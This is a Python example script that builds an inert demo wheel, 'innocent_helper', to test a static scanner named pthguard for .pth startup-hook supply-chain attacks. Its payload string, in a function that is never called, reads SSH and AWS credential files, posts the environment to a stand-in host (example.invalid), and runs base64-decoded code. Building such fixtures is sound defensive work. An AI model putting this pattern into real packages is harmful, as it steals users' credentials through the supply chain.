"""Build an INERT imitation of a startup-hook supply-chain attack for trying pthguard.

The generated wheel contains a ``demo.pth`` that imports a sibling module. The module only
*mentions* credential paths and network calls inside a function that is never called, and the
wheel is never installed by this script. pthguard reads it statically.

    python examples/make_demo_wheel.py /tmp/demo
    pthguard check /tmp/demo
"""

from __future__ import annotations

import sys
import zipfile
from pathlib import Path

PAYLOAD = """\
import os, urllib.request, base64

def _never_called():
    for p in ("~/.ssh/id_rsa", "~/.aws/credentials"):
        open(os.path.expanduser(p))
    env = dict(os.environ)
    urllib.request.urlopen("http://example.invalid/collect", data=repr(env).encode())
    exec(base64.b64decode("cHJpbnQoJ2hpJyk="))
    if os.fork() == 0:
        os.setsid()
"""


def main() -> None:
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "demo-dist")
    out.mkdir(parents=True, exist_ok=True)
    wheel = out / "innocent_helper-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("innocent_helper/__init__.py", "")
        zf.writestr("demo.pth", "import demo_payload; demo_payload.noop\n")
        zf.writestr("demo_payload.py", PAYLOAD)
        zf.writestr("innocent_helper-1.0.0.dist-info/METADATA", "Name: innocent-helper\nVersion: 1.0.0\n")
    print(wheel)


if __name__ == "__main__":
    main()
